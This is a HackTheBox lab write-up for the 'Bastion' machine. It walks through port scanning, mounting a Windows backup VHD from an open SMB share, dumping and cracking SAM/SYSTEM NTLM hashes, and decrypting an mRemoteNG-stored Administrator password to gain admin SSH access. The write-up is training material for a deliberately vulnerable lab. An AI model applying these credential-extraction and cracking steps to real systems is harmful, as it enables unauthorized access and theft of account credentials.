# Bastion

## Introduction

Welcome to my another writeup! In this HackTheBox [Bastion](https://app.hackthebox.com/machines/Bastion) machine, you'll learn: Mounting Virutal Hard Disk image via `guestmount`, extracting NTLM hashes via SAM and SYSTEM files and crack them via `samdump2`, privilege escalation via mRemoteNG's insecure password storage, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: bastion\\l4mpje to bastion\\Administrator](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bastion/images/Bastion.png)

## Service Enumeration

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|13:04:09(HKT)]
└> export RHOSTS=10.10.10.134
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|13:04:12(HKT)]
└> export LHOST=`ifconfig tun0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|13:04:40(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -Pn -oN scanning/rustscan.txt
[...]
Open 10.10.10.134:22
Open 10.10.10.134:135
Open 10.10.10.134:139
Open 10.10.10.134:445
Open 10.10.10.134:5985
Open 10.10.10.134:47001
Open 10.10.10.134:49666
Open 10.10.10.134:49664
Open 10.10.10.134:49665
Open 10.10.10.134:49669
Open 10.10.10.134:49668
Open 10.10.10.134:49667
Open 10.10.10.134:49670
[...]
PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=
|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN
135/tcp   open  msrpc       syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn syn-ack Microsoft Windows netbios-ssn
445/tcp   open                   syn-ack Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http        syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http        syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc       syn-ack Microsoft Windows RPC
49665/tcp open  msrpc       syn-ack Microsoft Windows RPC
49666/tcp open  msrpc       syn-ack Microsoft Windows RPC
49667/tcp open  msrpc       syn-ack Microsoft Windows RPC
49668/tcp open  msrpc       syn-ack Microsoft Windows RPC
49669/tcp open  msrpc       syn-ack Microsoft Windows RPC
49670/tcp open  msrpc       syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
[...]
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-04T07:05:47+02:00
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|13:04:42(HKT)]
└> sudo nmap -sU -Pn $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
PORT     STATE         SERVICE
123/udp  open|filtered ntp
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
500/udp  open|filtered isakmp
4500/udp open|filtered nat-t-ike
5050/udp open|filtered mmcc
5353/udp open|filtered zeroconf
5355/udp open|filtered llmnr
```

According to `rustscan` and `nmap` result, the target machine has 13 port are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22/TCP            | OpenSSH for_Windows_7.9       |
|135/TCP, 49664/TCP, 49665/TCP, 49666/TCP, 49667/TCP, 49668/TCP, 49669/TCP, 49670/TCP| RPC|
|139/TCP           | NetBIOS                       |
|445/TCP           | SMB                           |
|5985/TCP, 47001/TCP| WinRM                        |

### SMB on TCP port 445

**Enumerate shares as `Guest` user:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|13:07:18(HKT)]
└> smbmap -H $RHOSTS -u 'Guest' -p ''   
[+] IP: 10.10.10.134:445	Name: 10.10.10.134                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	Backups                                           	READ, WRITE	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
```

- Non-default share: `Backups`

**Check share `Backups`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|13:07:55(HKT)]
└> smbclient //$RHOSTS/Backups
Password for [WORKGROUP\siunam]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Aug  4 13:07:20 2023
  ..                                  D        0  Fri Aug  4 13:07:20 2023
  note.txt                           AR      116  Tue Apr 16 18:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 20:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 20:44:02 2019
[...]
```

**`note.txt`:**
```shell
smb: \> get note.txt 
getting file \note.txt of size 116 as note.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|13:08:38(HKT)]
└> cat note.txt 

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

**Interesting things in `WindowsImageBackup\`:**
```shell
smb: \> dir WindowsImageBackup\
  .                                  Dn        0  Fri Feb 22 20:44:02 2019
  ..                                 Dn        0  Fri Feb 22 20:44:02 2019
  L4mpje-PC                          Dn        0  Fri Feb 22 20:45:32 2019

		5638911 blocks of size 4096. 1178813 blocks available
smb: \> dir WindowsImageBackup\L4mpje-PC\
  .                                  Dn        0  Fri Feb 22 20:45:32 2019
  ..                                 Dn        0  Fri Feb 22 20:45:32 2019
  Backup 2019-02-22 124351           Dn        0  Fri Feb 22 20:45:32 2019
  Catalog                            Dn        0  Fri Feb 22 20:45:32 2019
  MediaId                            An       16  Fri Feb 22 20:44:02 2019
  SPPMetadataCache                   Dn        0  Fri Feb 22 20:45:32 2019
```

Looks like it's a backup Windows image for host `L4mpje-PC`.

```shell
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
  .                                  Dn        0  Fri Feb 22 20:45:32 2019
  ..                                 Dn        0  Fri Feb 22 20:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 20:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 20:45:32 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 20:45:32 2019
[...]
```

## Initial Foothold

However, according to the sysadmins in `note.txt`, we shouldn't download the entire backup files locally.

**So, we can just mount the SMB share to our attacker machine:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|14:20:08(HKT)]
└> sudo mkdir /mnt/smb
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|14:20:30(HKT)]
└> sudo mount //$RHOSTS/Backups /mnt/smb
Password for root@//10.10.10.134/Backups: 

┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|14:21:02(HKT)]
└> ls -lah /mnt/smb 
total 8.5K
drwxr-xr-x 2 root root 4.0K Aug  4 13:07 .
drwxr-xr-x 4 root root 4.0K Aug  4 14:20 ..
-r-xr-xr-x 1 root root  116 Apr 16  2019 note.txt
-rwxr-xr-x 1 root root    0 Feb 22  2019 SDT65CB.tmp
drwxr-xr-x 2 root root    0 Feb 22  2019 WindowsImageBackup
```

**Then, in the `WindowsImageBackup` directory, we found 2 `.vhd` files, which are Virtual Hard Disk image:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|14:21:41(HKT)]
└> file /mnt/smb/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/*.vhd
/mnt/smb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd: Microsoft Disk Image, Virtual Server or Virtual PC, Creator vsim 1.1 (W2k) Fri Feb 22 12:44:00 2019, 104970240 bytes, CHS 1005/12/17, State 0x1
/mnt/smb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd: Microsoft Disk Image, Virtual Server or Virtual PC, Creator vsim 1.1 (W2k) Fri Feb 22 12:44:01 2019, 15999492096 bytes, CHS 31001/16/63, State 0x1
```

In Windows, users can backup the entire system and saved it as a `.vhd` file.

**According to [HackTricks](https://book.hacktricks.xyz/linux-hardening/useful-linux-commands#common-bash), we can use `guestmount` to mount the Windows disk image:**
```sh
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd
```

**Mount the largest images:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|14:22:47(HKT)]
└> sudo mkdir /mnt/vhd
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|14:29:10(HKT)]
└> sudo guestmount --add /mnt/smb/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|14:31:21(HKT)]
└> sudo zsh
┌[root♥Mercury]-(/home/siunam/ctf/htb/Machines/Bastion)-[2023.08.04|14:31:22(HKT)]
└> cd /mnt/vhd           
┌[root♥Mercury]-(/mnt/vhd)-[2023.08.04|14:31:30(HKT)]
└> ls -lah                  
total 2.0G
drwxrwxrwx 1 root root  12K Feb 22  2019  .
drwxr-xr-x 4 root root 4.0K Aug  4 14:22  ..
drwxrwxrwx 1 root root    0 Feb 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root   24 Jun 11  2009  autoexec.bat
-rwxrwxrwx 1 root root   10 Jun 11  2009  config.sys
lrwxrwxrwx 2 root root   14 Jul 14  2009 'Documents and Settings' -> /sysroot/Users
-rwxrwxrwx 1 root root 2.0G Feb 22  2019  pagefile.sys
drwxrwxrwx 1 root root    0 Jul 14  2009  PerfLogs
drwxrwxrwx 1 root root 4.0K Jul 14  2009  ProgramData
drwxrwxrwx 1 root root 4.0K Apr 12  2011 'Program Files'
drwxrwxrwx 1 root root    0 Feb 22  2019  Recovery
drwxrwxrwx 1 root root 4.0K Feb 22  2019 'System Volume Information'
drwxrwxrwx 1 root root 4.0K Feb 22  2019  Users
drwxrwxrwx 1 root root  16K Feb 22  2019  Windows
```

We can now explore the backup image's file system!

**Enumerate user `L4mpje` user profile:**
```shell
┌[root♥Mercury]-(/mnt/vhd)-[2023.08.04|14:33:28(HKT)]
└> ls -lah Users/L4mpje/Desktop 
total 8.5K
drwxrwxrwx 1 root root    0 Feb 22  2019 .
drwxrwxrwx 1 root root 8.0K Feb 22  2019 ..
-rwxrwxrwx 1 root root  282 Feb 22  2019 desktop.ini
┌[root♥Mercury]-(/mnt/vhd)-[2023.08.04|14:33:35(HKT)]
└> ls -lah Users/L4mpje/Downloads 
total 8.5K
drwxrwxrwx 1 root root    0 Feb 22  2019 .
drwxrwxrwx 1 root root 8.0K Feb 22  2019 ..
-rwxrwxrwx 1 root root  282 Feb 22  2019 desktop.ini
┌[root♥Mercury]-(/mnt/vhd)-[2023.08.04|14:33:37(HKT)]
└> ls -lah Users/L4mpje/Documents 
total 13K
drwxrwxrwx 1 root root 4.0K Feb 22  2019  .
drwxrwxrwx 1 root root 8.0K Feb 22  2019  ..
-rwxrwxrwx 1 root root  402 Feb 22  2019  desktop.ini
lrwxrwxrwx 2 root root   27 Feb 22  2019 'My Music' -> /sysroot/Users/L4mpje/Music
lrwxrwxrwx 2 root root   30 Feb 22  2019 'My Pictures' -> /sysroot/Users/L4mpje/Pictures
lrwxrwxrwx 2 root root   28 Feb 22  2019 'My Videos' -> /sysroot/Users/L4mpje/Videos
```

Nothing weird.

Since we have access to all the files in this Windows image, we can try to hunt for passwords.

According to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#sam-and-system-files), we can try finding **SAM and SYSTEM files**.

> Note: The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in `%SystemRoot%/system32/config/SAM` and is mounted on `HKLM/SAM`.

**Usually the SAM and SYSTEM files will be at:**
```
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

**After enumerating those directories, we found the SAM and SYSTEM files are at `%SYSTEMROOT%\System32\config\`:**
```shell
┌[root♥Mercury]-(/mnt/vhd)-[2023.08.04|14:39:15(HKT)]
└> file Windows/System32/config/SYSTEM
Windows/System32/config/SYSTEM: MS Windows registry file, NT/2000 or above
┌[root♥Mercury]-(/mnt/vhd)-[2023.08.04|14:39:17(HKT)]
└> file Windows/System32/config/SAM   
Windows/System32/config/SAM: MS Windows registry file, NT/2000 or above
```

**Then, generate a hash file for `john` using `samdump2`:**
```shell
┌[root♥Mercury]-(/mnt/vhd)-[2023.08.04|14:40:15(HKT)]
└> samdump2 Windows/System32/config/SYSTEM Windows/System32/config/SAM -o /home/siunam/ctf/htb/Machines/Bastion/sam.txt 
┌[root♥Mercury]-(/mnt/vhd)-[2023.08.04|14:40:59(HKT)]
└> cat /home/siunam/ctf/htb/Machines/Bastion/sam.txt 
*disabled* Administrator:500:{Redacted}:{Redacted}:::
*disabled* Guest:501:{Redacted}:{Redacted}:::
L4mpje:1000:{Redacted}:{Redacted}:::
```

As you can see, there's a `L4mpje`'s NTLM hash!

**Next, we can then crack it via `john`:**
```shell
┌[root♥Mercury]-(/mnt/vhd)-[2023.08.04|14:42:06(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT /home/siunam/ctf/htb/Machines/Bastion/sam.txt
[...]
{Redacted}     (L4mpje)     
[...]
```

Cracked!

**We can now verify the credentials is correct via SMB share listing with user `L4mpje` credentials:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|14:42:44(HKT)]
└> smbclient -L //$RHOSTS/ -U 'L4mpje'
Password for [WORKGROUP\L4mpje]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
[...]
```

It's correct!

**Since SSH and WinRM is available on the target machine, we can try to SSH to user `L4mpje`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|14:43:47(HKT)]
└> ssh L4mpje@$RHOSTS
L4mpje@10.10.10.134's password: 
[...]
l4mpje@BASTION C:\Users\L4mpje>whoami && ipconfig /all                                                     
bastion\l4mpje                                                                                             

Windows IP Configuration                                                                                   

   Host Name . . . . . . . . . . . . : Bastion                                                             
   Primary Dns Suffix  . . . . . . . :                                                                     
   Node Type . . . . . . . . . . . . : Hybrid                                                              
   IP Routing Enabled. . . . . . . . : No                                                                  
   WINS Proxy Enabled. . . . . . . . : No                                                                  

Ethernet adapter Ethernet0:                                                                                

   Connection-specific DNS Suffix  . :                                                                     
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection                          
   Physical Address. . . . . . . . . : 00-50-56-B9-87-18                                                   
   DHCP Enabled. . . . . . . . . . . : No                                                                  
   Autoconfiguration Enabled . . . . : Yes                                                                 
   Link-local IPv6 Address . . . . . : fe80::1df8:cf16:33a:98f9%4(Preferred)                               
   IPv4 Address. . . . . . . . . . . : 10.10.10.134(Preferred)                                             
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                                                       
   Default Gateway . . . . . . . . . : 10.10.10.2                                                          
   DHCPv6 IAID . . . . . . . . . . . : 100683862                                                           
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-01-96-CA-08-00-27-0A-7D-93                           
   DNS Servers . . . . . . . . . . . : 10.10.10.2                                                          
[...]                                                               
```

I'm user `bastion\l4mpje`!

**user.txt:**
```shell
l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                                       
{Redacted}
```

## Privilege Escalation

### bastion\\l4mpje to bastion\\Administrator

After gaining initial foothold on the target machine, we can escalate our privilege. To do so, we need to enumerate the system.

**Local users:**
```shell
l4mpje@BASTION C:\Users\L4mpje>net user                                                                    
[...]
-------------------------------------------------------------------------------                            
Administrator            DefaultAccount           Guest                                                    
L4mpje                                                                                                     
```

- Non-default local user: `L4mpje`

**User `L4mpje` details:**
```shell
l4mpje@BASTION C:\Users\L4mpje>net user L4mpje                                                             
User name                    L4mpje                                                                        
Full Name                    L4mpje                                                                        
[...]
Local Group Memberships      *Users                                                                        
Global Group memberships     *None                                                                         
```

No other group membership other than the default `Users`.

**System information:**
```shell
l4mpje@BASTION C:\Users\L4mpje>systeminfo                                                                  
ERROR: Access denied                                                                                       
```

Hmm... Access denied... Maybe the system is harden, so that low privilege users can't use a certain commands. 

**After I enumerated installed software, I found something stands out:**
```shell
l4mpje@BASTION C:\Users\L4mpje>dir "C:\Program Files (x86)"                                                
[...]                                                                 
16-07-2016  15:23    <DIR>          Common Files                                                           
23-02-2019  10:38    <DIR>          Internet Explorer                                                      
16-07-2016  15:23    <DIR>          Microsoft.NET                                                          
22-02-2019  15:01    <DIR>          mRemoteNG                                                              
23-02-2019  11:22    <DIR>          Windows Defender                                                       
23-02-2019  10:38    <DIR>          Windows Mail                                                           
23-02-2019  11:22    <DIR>          Windows Media Player                                                   
16-07-2016  15:23    <DIR>          Windows Multimedia Platform                                            
16-07-2016  15:23    <DIR>          Windows NT                                                             
23-02-2019  11:22    <DIR>          Windows Photo Viewer                                                   
16-07-2016  15:23    <DIR>          Windows Portable Devices                                               
16-07-2016  15:23    <DIR>          WindowsPowerShell                                                      
```

The `mRemoteNG` is kinda sussy.

According to [mRemoteNG](https://mremoteng.org/), it's a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager for Windows. mRemoteNG adds bug fixes and new features to mRemote and allows you to view all of your remote connections in a simple yet powerful tabbed interface.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bastion/images/Pasted%20image%2020230804160810.png)

**Hmm... Maybe there's a vulnerability that allows us to escalate our privilege to a higher one?**

**After fumbling around in the `AppData` directory, I found that the mRemoteNG version is `1.76.11.40527`:**
```shell
l4mpje@BASTION C:\Users\L4mpje>dir C:\Users\L4mpje\Appdata\Local\mRemoteNG\mRemoteNG.exe_Url_pjpxdehxpaaorq
g2thmuhl11a34i3ave                                                                                         
 Volume in drive C has no label.                                                                           
 Volume Serial Number is 1B7D-E692                                                                         

 Directory of C:\Users\L4mpje\Appdata\Local\mRemoteNG\mRemoteNG.exe_Url_pjpxdehxpaaorqg2thmuhl11a34i3ave   

22-02-2019  15:01    <DIR>          .                                                                      
22-02-2019  15:01    <DIR>          ..                                                                     
22-02-2019  15:03    <DIR>          1.76.11.40527                                                          
```

However, it seems like there's no vulnerability that we can leverage.

**Then, in [mRemoteNG's GitHub repository's releases](https://github.com/mRemoteNG/mRemoteNG/releases?page=2), version `1.76.11` is released at Oct 19, 2018:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bastion/images/Pasted%20image%2020230804154041.png)

**In the next version, there's an interesting issue:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bastion/images/Pasted%20image%2020230804154137.png)

Hmm... I wonder **how mRemoteNG stores remote connections' password**...

After searching "mRemoteNG password decrypt", I found [this GitHub repository](https://github.com/kmahyyg/mremoteng-decrypt).

In there, we can use the ``mremoteng_decrypt.py`` Python script to decrypt  mRemoteNG passwords.

**In `AppData\Roaming`, we can also find mRemoteNG's user configurations:**
```shell
l4mpje@BASTION C:\Users\L4mpje>dir %APPDATA%\mRemoteNG                                                     
[...]                                                                 
22-02-2019  15:03             6.316 confCons.xml                                                           
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                
[...]
```

**`confCons.xml`:**
```xml
<?xml version="1.0" encoding="utf-8"?>                                                                     
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/{Redacted}==" Hostname="127.0.0.1" Protocol="RDP"[...]
```

In here, we can see that user `Administrator`'s RDP (Remote Desktop Protocol) connection to `127.0.0.1`'s password is encrypted via AES GCM mode.

**Armed with above information, we can decrypt `Administrator`'s password!**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|16:16:02(HKT)]
└> python3 mremoteng_decrypt.py --help
usage: mremoteng_decrypt.py [-h] [-f FILE | -rf REALFILE | -s STRING] [-p PASSWORD] [-L LEGACY]

Decrypt mRemoteNG passwords.

options:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  Name of file containing mRemoteNG password
  -rf REALFILE, --realFile REALFILE
                        Name of the Real mRemoteNG connections file containing the passwords
  -s STRING, --string STRING
                        base64 string of mRemoteNG password
  -p PASSWORD, --password PASSWORD
                        Custom password
  -L LEGACY, --legacy LEGACY
                        version <= 1.74
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|16:16:36(HKT)]
└> python3 mremoteng_decrypt.py -s 'aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/{Redacted}=='
Password: thXLHM96BeKL0ER2
```

**Nice! Let's try to SSH into `Administrator`!**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bastion)-[2023.08.04|16:17:00(HKT)]
└> ssh Administrator@$RHOSTS
Administrator@10.10.10.134's password: 
[...]
administrator@BASTION C:\Users\Administrator>whoami && ipconfig /all                                       
bastion\administrator                                                                                      

Windows IP Configuration                                                                                   

   Host Name . . . . . . . . . . . . : Bastion                                                             
   Primary Dns Suffix  . . . . . . . :                                                                     
   Node Type . . . . . . . . . . . . : Hybrid                                                              
   IP Routing Enabled. . . . . . . . : No                                                                  
   WINS Proxy Enabled. . . . . . . . : No                                                                  

Ethernet adapter Ethernet0:                                                                                

   Connection-specific DNS Suffix  . :                                                                     
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection                          
   Physical Address. . . . . . . . . : 00-50-56-B9-87-18                                                   
   DHCP Enabled. . . . . . . . . . . : No                                                                  
   Autoconfiguration Enabled . . . . : Yes                                                                 
   Link-local IPv6 Address . . . . . : fe80::1df8:cf16:33a:98f9%4(Preferred)                               
   IPv4 Address. . . . . . . . . . . : 10.10.10.134(Preferred)                                             
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                                                       
   Default Gateway . . . . . . . . . : 10.10.10.2                                                          
   DHCPv6 IAID . . . . . . . . . . . : 100683862                                                           
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-01-96-CA-08-00-27-0A-7D-93                           
   DNS Servers . . . . . . . . . . . : 10.10.10.2                                                          
[...]
```

I'm now `bastion\administrator`! :D

## Rooted

**root.txt:**
```shell
administrator@BASTION C:\Users\Administrator\Desktop>type root.txt                                         
{Redacted}                                                                           
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bastion/images/Pasted%20image%2020230804155525.png)

## Conclusion

What we've learned:

1. Mounting Virutal Hard Disk image via `guestmount`
2. Extracting NTLM hashes via SAM and SYSTEM files and crack them via `samdump2`
3. Vertical privilege escalation via mRemoteNG's insecure password storage